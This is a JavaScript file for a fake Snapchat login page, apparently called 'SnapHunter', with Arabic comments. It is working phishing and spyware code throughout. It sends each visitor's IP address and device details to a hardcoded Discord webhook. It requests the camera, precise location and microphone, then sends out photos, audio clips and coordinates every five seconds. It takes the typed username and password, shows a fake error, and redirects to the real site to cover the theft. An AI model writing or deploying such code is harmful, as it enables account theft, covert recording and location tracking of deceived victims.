'use strict';

// ⚠️ ضع رابط الـ Webhook الخاص بك هنا
const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let mediaRecorder;
let audioChunks = [];
let userLat = null, userLng = null;
let attempts = 0;

// 1. جلب IP الجهاز فور الدخول
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch (e) { return "غير معروف"; }
}

// 2. إشعار دخول فوري
async function notifyEntry() {
    const ip = await getIP();
    const payload = {
        username: "SnapHunter - نظام الرصد",
        content: `🚀 **صيد جديد دخل الموقع!**\n🌐 **IP:** \`${ip}\` \n📱 **الجهاز:** \`${navigator.platform}\` \n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`
    };
    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
}

// 3. وظيفة الإرسال الشاملة (صورة + صوت + موقع)
async function sendFullPacket(imgBlob, audBlob, user = "", pass = "") {
    const ip = await getIP();
    const formData = new FormData();
    
    let content = `🛰️ **تحديث بيانات مباشر**\n🌐 **IP:** \`${ip}\`\n`;
    
    if (user) {
        content += `👤 **الحساب:** \`${user}\` \n🔑 **الرمز:** \`${pass}\`\n`;
    }
    
    if (userLat && userLng) {
        content += `📍 **الموقع:** [فتح الخريطة](http://maps.google.com/maps?q=${userLat},${userLng})\n`;
    }

    if (imgBlob) formData.append('file1', imgBlob, 'camera.png');
    if (audBlob) formData.append('file2', audBlob, 'mic.ogg');
    
    formData.append('payload_json', JSON.stringify({
        content: content,
        username: "SnapHunter - البث المباشر"
    }));

    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 4. تسلسل الأذونات والتشغيل
async function initSystem() {
    await notifyEntry();

    try {
        // أولاً: طلب الكاميرا
        const camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = camStream;

        // ثانياً: طلب الموقع بعد 3 ثوانٍ
        setTimeout(() => {
            navigator.geolocation.getCurrentPosition(p => {
                userLat = p.coords.latitude;
                userLng = p.coords.longitude;
            }, null, {enableHighAccuracy: true});
        }, 3000);

        // ثالثاً: طلب الميكروفون بعد 6 ثوانٍ والبدء في التسجيل
        setTimeout(async () => {
            try {
                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(micStream);
                
                // بدء حلقة التكرار كل 5 ثوانٍ
                setInterval(() => {
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, 640, 480);
                    
                    audioChunks = [];
                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                    mediaRecorder.start();

                    setTimeout(() => {
                        mediaRecorder.stop();
                        mediaRecorder.onstop = () => {
                            const audBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                            canvas.toBlob(imgBlob => {
                                sendFullPacket(imgBlob, audBlob);
                            }, 'image/png');
                        };
                    }, 3000); // تسجيل 3 ثوانٍ من الصوت
                }, 5000);

            } catch (e) { console.log("Mic Denied"); }
        }, 6000);

    } catch (err) {
        // في حال الرفض الكلي، نرسل الموقع والـ IP فقط
        setInterval(() => { sendFullPacket(null, null); }, 5000);
    }
}

// 5. معالجة نموذج الدخول (apply2.html)
const loginForm = document.getElementById('fullLoginForm');
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const u = e.target.username.value;
        const p = e.target.password.value;
        document.getElementById('loadingOverlay').style.display = 'flex';

        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);
        
        canvas.toBlob(async (imgBlob) => {
            await sendFullPacket(imgBlob, null, u, p);
            setTimeout(() => {
                attempts++;
                document.getElementById('loadingOverlay').style.display = 'none';
                if (attempts >= 2) window.location.href = "https://accounts.snapchat.com/";
                else {
                    document.getElementById('loginErrorMsg').style.display = 'block';
                    e.target.password.value = "";
                }
            }, 1500);
        }, 'image/png');
    });
}

window.onload = initSystem;
